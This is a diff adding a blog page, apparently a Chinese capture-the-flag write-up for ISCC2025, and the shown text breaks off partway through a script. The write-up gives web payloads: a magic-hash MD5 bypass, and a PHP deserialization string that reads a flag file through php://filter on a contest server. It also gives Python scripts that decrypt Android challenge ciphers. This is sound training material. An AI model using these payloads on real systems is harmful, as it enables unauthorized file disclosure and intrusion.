@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Huaji">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Huaji">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="搞到现在总算有个博客了">
+    <meta name="description" content="ISCC2025-WP区域赛web-哪吒的试炼题目提到要吃藕，并且附上了翻译，所以想到在get里填参数，即 112.126.73.173:9999?food&#x3D;lotus root，跳转  进去发现按钮点不了，f12删掉标签中的disabled&#x3D;&quot;&quot;，点击之后看见php  分析得知，第一个用双写绕过，第二个用md5值为0e的两个字符串绕过，所以post请求： 1nezha&#x3D;&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC2025-WP">
+<meta property="og:url" content="http://huajihd.github.io/2025/05/18/ISCC-WP/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="ISCC2025-WP区域赛web-哪吒的试炼题目提到要吃藕，并且附上了翻译，所以想到在get里填参数，即 112.126.73.173:9999?food&#x3D;lotus root，跳转  进去发现按钮点不了，f12删掉标签中的disabled&#x3D;&quot;&quot;，点击之后看见php  分析得知，第一个用双写绕过，第二个用md5值为0e的两个字符串绕过，所以post请求： 1nezha&#x3D;&amp;#1">
+<meta property="og:locale">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/qy-web1-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/qy-web1-2.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/qy-web1-3.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/qy-mobile2-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/mobile1-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/mobile1-2.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-2.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-7.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-5.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-3.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-4.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/mobile2-6.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re1-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re1-2.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re1-3.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re2-1.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re2-2.png">
+<meta property="og:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/re2-3.png">
+<meta property="article:published_time" content="2025-05-18T05:45:52.000Z">
+<meta property="article:modified_time" content="2025-07-07T05:53:03.749Z">
+<meta property="article:author" content="Huaji">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://huajihd.github.io/%E8%B5%84%E6%96%99/md/ISCC/qy-web1-1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    <title>ISCC2025-WP · Huajiの小窝</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">Huajiの小窝.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">Huajiの小窝.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">ISCC2025-WP</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                ISCC2025-WP
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+</div>
+
+                <!-- 文章字数统计 -->
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/05/18</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="ISCC2025-WP"><a href="#ISCC2025-WP" class="headerlink" title="ISCC2025-WP"></a>ISCC2025-WP</h1><h1 id="区域赛"><a href="#区域赛" class="headerlink" title="区域赛"></a>区域赛</h1><h3 id="web-哪吒的试炼"><a href="#web-哪吒的试炼" class="headerlink" title="web-哪吒的试炼"></a>web-哪吒的试炼</h3><p>题目提到要吃藕，并且附上了翻译，所以想到在get里填参数，即</p>
+<p><code>112.126.73.173:9999?food=lotus root</code>，跳转</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-1.png" alt="qy-web1-1"></p>
+<p>进去发现按钮点不了，f12删掉标签中的<code>disabled=&quot;&quot;</code>，点击之后看见php</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-2.png" alt="qy-web1-2"></p>
+<p>分析得知，第一个用双写绕过，第二个用md5值为0e的两个字符串绕过，所以post请求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nezha=&#123;&quot;incantation&quot;:&quot;I_am_the_I_am_the_spirit_of_firespirit_of_fire&quot;,&quot;md5&quot;:&quot;s878926199a&quot;,&quot;power&quot;:&quot;s155964671a&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-web1-3.png" alt="qy-web1-3"></p>
+<p>发现<strong>明</strong>拆开是<strong>日  月</strong>,对应 <strong>sun</strong>和<strong>moon</strong>，前者去尾后者去头，再将后者倒着写，就是suoom，所以</p>
+<p>当时是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明=suoom</span><br><span class="line">李=woolihc</span><br><span class="line">ISCC&#123;早晴枫林红&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以当时flag是ISCC{suetsueergwooniwwoooowsilrow}</p>
+<p>现在应该是ISCC{wooniwwoooowsuetsilrow}</p>
+<h3 id="mobile-Detective"><a href="#mobile-Detective" class="headerlink" title="mobile-Detective"></a>mobile-Detective</h3><p>用jadx反编译，打开找到mainActivity，可以发现这一段比对的文字</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/ISCC/qy-mobile2-1.png" alt="qy-mobile2-1"></p>
+<p>发现com.example.detective.a.a(String)中是对密文的操作，所以写脚本跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hex_from_cipher</span>(<span class="params">cipher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">ord</span>(ch):04x&#125;</span>&#x27;</span> <span class="keyword">for</span> ch <span class="keyword">in</span> cipher)</span><br><span class="line">    <span class="keyword">return</span> hex_str[<span class="number">2</span>:] <span class="keyword">if</span> hex_str.startswith(<span class="string">&#x27;00&#x27;</span>) <span class="keyword">else</span> hex_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_undo_padding</span>(<span class="params">hex_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(hex_str) % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        hex_str += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_undo_pair_shuffle</span>(<span class="params">replaced: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    out, i = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(replaced):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">3</span> &lt; <span class="built_in">len</span>(replaced) <span class="keyword">and</span> replaced[i+<span class="number">2</span>:i+<span class="number">4</span>] == <span class="string">&#x27;21&#x27;</span>:</span><br><span class="line">            c2, c1 = replaced[i], replaced[i+<span class="number">1</span>]</span><br><span class="line">            out.extend([c1, c2])</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.extend(replaced[i:i+<span class="number">2</span>])</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_split_and_fix_zero</span>(<span class="params">concat: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    half = <span class="built_in">len</span>(concat) // <span class="number">2</span></span><br><span class="line">    sb2, sb = concat[:half], concat[half:]</span><br><span class="line">    sb = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> ch == <span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> (idx == <span class="number">0</span> <span class="keyword">or</span> idx % <span class="number">3</span> == <span class="number">0</span>) <span class="keyword">else</span> ch</span><br><span class="line">                 <span class="keyword">for</span> idx, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(sb))</span><br><span class="line">    sb2 = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> ch == <span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> (idx == <span class="number">1</span> <span class="keyword">or</span> (idx - <span class="number">1</span>) % <span class="number">3</span> == <span class="number">0</span>) <span class="keyword">else</span> ch</span><br><span class="line">                  <span class="keyword">for</span> idx, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(sb2))</span><br><span class="line">    res = []</span><br><span class="line">    even = odd = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(concat)):</span><br><span class="line">        <span class="keyword">if</span> idx % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            res.append(sb[even]);  even += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(sb2[odd]);  odd += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_hex_to_plain</span>(<span class="params">hex_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    out, i = [], <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(hex_str):</span><br><span class="line">        <span class="keyword">if</span> hex_str[i] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(hex_str):</span><br><span class="line">            out.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str[i+<span class="number">1</span>:i+<span class="number">3</span>], <span class="number">16</span>)))</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(hex_str[i:i+<span class="number">4</span>], <span class="number">16</span>)))</span><br><span class="line">            i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;顶层接口：密文 ➜ 明文&quot;&quot;&quot;</span></span><br><span class="line">    step1 = _hex_from_cipher(cipher)</span><br><span class="line">    step2 = _undo_padding(step1)</span><br><span class="line">    step3 = _undo_pair_shuffle(step2)</span><br><span class="line">    step4 = _split_and_fix_zero(step3)</span><br><span class="line">    <span class="keyword">return</span> _hex_to_plain(step4)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    xor_key = [<span class="number">0x53</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>]</span><br><span class="line">    res = <span class="string">&quot;100944420F1F4252655A443C4D53301972&quot;</span></span><br><span class="line"></span><br><span class="line">    res_chr=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">        res_chr.append((<span class="built_in">int</span>(res[i:i+<span class="number">2</span>],<span class="number">16</span>)))</span><br><span class="line">    <span class="built_in">print</span>(res_chr)</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res_chr)):</span><br><span class="line">        flag.append((res_chr[i]^xor_key[i%(<span class="built_in">len</span>(xor_key))]))</span><br><span class="line"></span><br><span class="line">    sample =<span class="built_in">bytes</span>(flag).decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Cipher :&quot;</span>, sample)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;&quot;</span>+decrypt(sample)+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="国赛"><a href="#国赛" class="headerlink" title="国赛"></a>国赛</h1><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>输入<strong>tom</strong></p>
+<p>然后<strong>clue&#x3D;O%3A3%3A%22Obj%22%3A0%3A%7B%7D%3B’</strong></p>
+<p>可以获得cheese is hidden in flag_of_cheese.php    ，所以payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://112.126.73.173:10086/Y2hlZXNlT25l.php?cheese_tracker=O%3A6%3A%22Cheese%22%3A2%3A%7Bs%3A7%3A%22flavors%22%3Ba%3A0%3A%7B%7Ds%3A5%3A%22color%22%3Bs%3A142%3A%22O%3A5%3A%22Jerry%22%3A3%3A%7Bs%3A19%3A%22%00%2A%00secretHidingSpot%22%3Bs%3A62%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag_of_cheese.php%22%3Bs%3A6%3A%22squeak%22%3BN%3Bs%3A5%3A%22shout%22%3BN%3B%7D%22%3B%7D</span><br></pre></td></tr></table></figure>
+
+<p>获取前半段flag</p>
+<p>又发现Y2hlZXNlT25l.php，文件名可以用base64解码，解完是cheeseOne，</p>
+<h2 id="mobile1-GGAD"><a href="#mobile1-GGAD" class="headerlink" title="mobile1-GGAD"></a>mobile1-GGAD</h2><p>com.example.ggad.b中拿到PRESET_VALUE<img src="/../../../../%E8%B5%84%E6%96%99/md/mobile1-1.png" alt="mobile1-1"></p>
+<p>com.example.ggad.c中拿到</p>
+<p><img src="/../../../../%E8%B5%84%E6%96%99/md/mobile1-2.png" alt="mobile1-2"></p>
+<p>所以可以写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 